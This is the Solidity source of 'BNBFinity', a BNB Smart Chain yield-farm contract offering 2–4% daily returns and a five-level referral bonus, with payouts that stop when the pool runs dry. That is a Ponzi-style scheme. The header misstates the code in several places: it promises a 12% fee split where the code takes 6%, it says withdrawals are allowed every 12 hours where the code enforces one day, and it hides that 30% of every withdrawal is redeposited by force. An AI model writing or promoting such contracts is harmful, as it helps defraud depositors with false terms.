/**
 *Submitted for verification at BscScan.com on 2022-01-24
*/

/*   BNBFinity - Community Experimental yield farm on Binance Smart Chain.
 *   The only official platform BNBFinity project!
 *   Version 1.0.1
 *   SPDX-License-Identifier: Unlicensed
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnbfinity.com                                      │
 *   │                                                                       │
 *   │   Telegram Live Support: @swifthbnbmoon                                │
 *   │   Telegram Public Chat: @bnbfinity                                    │
 *   │                                                                       │
 *   │   E-mail: [email protected]                                         │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet
 *   2) Choose one of the tariff plans, enter the BNB amount (0.02 BNB minimum) using our website "Stake" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *   5) Antiy-Drain system implemented to ensure system longevity
 *   6) We aim to build a strong community through team work, pls share your link and earn more...
 *
 *   [STAKING CONDITIONS]
 *
 *   - Minimal deposit: 1 [SUPPORTED_ALT], no maximal limit
 *   - Total income: based on your tarrif plan (from 2% to 4% daily) 
 *   - Yields every seconds, withdraw any time
 *   - Yield Cap from 160% to Infinity 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5-level referral reward: 8% - 2% - 1% - 0.75% - 0.25%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 88% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 12% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   Note: This is experimental community project,
 *   which means this project has high risks as well as high profits.
 *   Once contract balance drops to zero payments will stops,
 *   deposit at your own risk.
 */

pragma solidity 0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract BNBFinityHSB {
	using SafeMath for uint256;
	using SafeERC20 for IERC20;

	IERC20 public salt;

	uint256 constant public INVEST_MIN_AMOUNT = 1; // 1 HSB
	uint256 constant internal ANTIWHALES = 3000;
	uint256[] public REFERRAL_PERCENTS = [800, 200, 100, 75, 25];
	uint256 constant public PROJECT_FEE = 600;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;

	bool public started;
	address payable public contract_;
	address payable public maintenanceWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable _maintenanceWallet, address _salt) {
		contract_ = payable(msg.sender);
		maintenanceWallet = _maintenanceWallet;
		salt = IERC20(_salt);

        plans.push(Plan(20000, 200));
        plans.push(Plan(40, 400));
        plans.push(Plan(60, 350));
        plans.push(Plan(90, 300));
        plans.push(Plan(60, 200));
	}

	function invest(address referrer, uint8 plan, uint256 _amount) public {
		if (!started) {
			if (msg.sender == contract_) {
				started = true;
			} else revert("Not started yet");
		}

		require(_amount >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

		require(_amount <= salt.allowance(msg.sender, address(this)));
		salt.safeTransferFrom(msg.sender, address(this), _amount);

		uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		users[contract_].bonus.add(_fee);
		salt.safeTransfer(maintenanceWallet, _fee);
		
		emit FeePayed(msg.sender, _fee.mul(2));

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}
			else{
			    user.referrer = contract_;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, _amount, block.timestamp));

		totalInvested = totalInvested.add(_amount);

		emit NewDeposit(msg.sender, plan, _amount);
	}
    
	function withdraw() public {
		User storage user = users[msg.sender];
        // Withdrawals are allowed only once per 12hrs
        require(block.timestamp >= user.checkpoint.add(1 days), '12hrsLimit');
        
		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		// Apply AntiWhale protocol
		uint256 contractBalance = salt.balanceOf(address(this));
		uint256 _maxAllowed = contractBalance.mul(ANTIWHALES).div(PERCENTS_DIVIDER);
		// Prevents Users from Draining Smartcontract [withdrawal up 30% of contract balance not allowed]
	
		if (_maxAllowed < totalAmount) {
			user.bonus = totalAmount.sub(_maxAllowed);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = _maxAllowed;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		
		// Transfer only 70% of User's Available FUNDS and force re-entry
		uint256 _withdrawn = totalAmount.mul(7000).div(PERCENTS_DIVIDER);

		salt.safeTransfer(msg.sender, _withdrawn);

		emit Withdrawn(msg.sender, _withdrawn);
		// Make User's re-entry with 30% balance.
        
		user.deposits.push(Deposit(4, totalAmount.sub(_withdrawn), block.timestamp));

		totalInvested = totalInvested.add(totalAmount.sub(_withdrawn));

		emit NewDeposit(msg.sender, 4, totalAmount.sub(_withdrawn));
	}

	function getContractBalance() public view returns (uint256) {
		return salt.balanceOf(address(this));
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User memory user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User memory user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}